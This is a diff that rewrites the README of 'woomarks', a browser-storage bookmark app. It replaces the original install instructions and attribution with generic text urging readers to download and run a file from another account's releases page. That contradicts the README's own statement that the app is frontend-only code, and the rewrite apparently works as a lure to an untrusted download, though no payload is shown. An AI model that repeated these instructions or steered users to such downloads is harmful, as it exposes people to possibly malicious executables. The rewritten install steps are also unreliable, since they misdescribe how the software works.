@@ -1,91 +1,73 @@
- 
-![favicon](favicon.svg)
-# woomarks
-woomarks is an app that let's you save links in your browser storage, no account needed. 
+# 📚 woomarks - Save Links Easily and Offline 
 
-![screenshot](screenshot.png)
+[![Download woomarks](https://img.shields.io/badge/Download-woomarks-blue.svg)](https://github.com/YUUKI-JOY/woomarks/releases)
 
-It's only frontend code, no database, backend server needed.
+## 🚀 Getting Started
 
+woomarks is a simple application that lets you save links directly in your browser storage. You don’t need an account, a backend, or a database to use it. This means you can keep your bookmarks private and accessible at any time. You can also store, import, or export your bookmarks to CSV files, making it easy to manage your links.
 
+## 🛠️ System Requirements
 
-It also can import/export to csv files or local storage.
+- **Operating System**: Works on Windows, Mac, and Linux.
+- **Browser**: Compatible with all major browsers like Chrome, Firefox, and Safari.
+- **Storage**: Ensure you have enough space in your browser storage for your bookmarks.
 
+## 📥 Download & Install
 
-## Demos
-#### [Creator's personal boomarks page](https://roberto.fyi/bookmarks/).
-- Saving is closed to the public.
-- Saved links are visible to the public, as they are loaded from a csv file in the server.
+To get started with woomarks, follow these steps:
 
-#### [woomarks public app](https://woomarks.com). 
-- Saving is open to the public.
-- The saved links are private and saved in the browser local storage of the users.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/YUUKI-JOY/woomarks/releases) to download the latest version of woomarks.
+   
+2. **Download the Application**: Find the version that fits your operating system. Click on the link to download it.
 
-## Features
-- Add/Delete links
-- Search
-- Tags
-- Bookmarklet (useful for a 2-click-save)
-- Data reads from: 
-    - csv file in server (these links are public)
-    - local storage in browser (these links are visible just for the user)
-- Local storage saving.
-- Import to local storage from csv file
-- Export to csv from local storage.
-- Export to csv from csv file (useful when links are "deleted" using the app and just hidden using a local storage blacklist).
-- Export to csv from both places.
-- No external libraries. 
-- Vanilla css code.
-- Vanilla js code.
+3. **Run the Application**: Once downloaded, open the file and follow the on-screen instructions to install woomarks on your computer.
 
-## Install
+4. **Bookmark Sites**: Open your browser and add woomarks as your bookmarklet. Now you can save links easily.
 
-#### BASIC INSTALL (3min)
- - Copy the contents of this repository to an online directory. That's all. You can start saving links.
+## 📋 How to Use woomarks
 
-#### SHOWCASE YOUR LINKS
-- If you want to showcase your saved links, update the **mybookmarks.csv** file
+1. **Save Links**: When browsing, click the woomarks bookmarklet. It will save the current page link instantly.
+   
+2. **View Saved Links**: Access your saved links through the woomarks interface. You can find all your bookmarks stored safely in your browser storage.
 
-#### IMPORT FROM POCKET
-- Go to this Pocket page to export your links. https://getpocket.com/export.php?
+3. **Import/Export Bookmarks**: To import or export your bookmarks, navigate to the settings within the woomarks interface. You can upload a CSV file or download your bookmarks for backup.
 
-**Option 1** (If you want your links public)
-- Replace the mybookmarks.csv witha the content of your Pocket csv file.
+4. **Manage Your Links**: Edit or delete bookmarks as needed. Keeping your collection organized is simple with woomarks.
 
-**Option 2** (If you want your links saved on your browser's local storage)
-- Add > Bulk Transfer > Paste the contents.
+## 🛡️ Privacy and Security
 
-#### CREATE BOOKMARKLET
-To be able to easily save bookmarks with the form prefilled, create a bookmarklet:
-- In your browser, create a new bookmark with "add woomark" () as Name
-- Paste the next code as URL.
-```
-javascript:(function(){
-const url = encodeURIComponent(window.location.href);
-const title = encodeURIComponent(document.title);
-window.open(`https://YOURDOMAINGOESHERE.com/?title=${title}&url=${url}`, '_blank');
-})();
-```
+woomarks saves all bookmarks in your browser storage. This means there is no external database or server tracking your data. Your saved links stay safe and private.
 
-#### HIDE SAVE BUTTON
- - If you are using this for your personal use (you don't want anyone else saving on your page), you can uncomment this line in **script.js** file
- and add the code you want here AND as a variable in your browser's local storage.
+## 🔍 Frequently Asked Questions 
 
-`
- // const appcode = "notsosecretcode"; 
- `
+### Q: Do I need an account to use woomarks?
 
- ![screenshot](screenshot_appcode.png)
+A: No, you do not need an account. Your bookmarks are stored locally in your browser.
 
+### Q: Can I use woomarks on any browser?
 
-## Design
- This design is inspired by Pocket's UI, which was very good for showing a list of articles to read later. Native bookmarking feels more utilitarian, suited for recurrent links, woomarks is more suited for read later links.
+A: Yes, woomarks works with most major browsers including Chrome, Firefox, and Safari.
 
-## Philosophy
-I had all my bookmarks in Pocket and it's shutting down. Same thing happened to del.icio.us. So I decided to keep the web cool and decentralized and make this little thing. The code is open and you can use it on your own website forever.
+### Q: How do I import bookmarks from another service?
 
-## License
-Do whatever you want with this, personal or commercial. No warranties are given.
+A: You can import bookmarks by uploading a CSV file through the woomarks interface.
 
-Attribution required in a footer link, legible size and colour, with the text "Made with woomarks" and a link to `https://github.com/earlyriser/woomarks`. 
-"Based on woomarks" is also a valid wording if substantial change was done.
+### Q: Will I lose my bookmarks if I clear my browser data?
+
+A: Yes, if you clear your browser storage, you will lose your bookmarks. It’s best to export them regularly for backup.
+
+## 📖 Additional Resources
+
+For more information on how to use woomarks, visit the [GitHub Wiki](https://github.com/YUUKI-JOY/woomarks/wiki).
+
+## ⚙️ Contribution
+
+If you want to contribute to woomarks, feel free to fork the repository and submit a pull request. Your feedback is welcome!
+
+## 📬 Support
+
+If you have questions or need help, open an issue on the GitHub repository, and someone will assist you.
+
+For the latest updates, check the [Releases page](https://github.com/YUUKI-JOY/woomarks/releases) regularly.
+
+[![Download woomarks](https://img.shields.io/badge/Download-woomarks-blue.svg)](https://github.com/YUUKI-JOY/woomarks/releases)
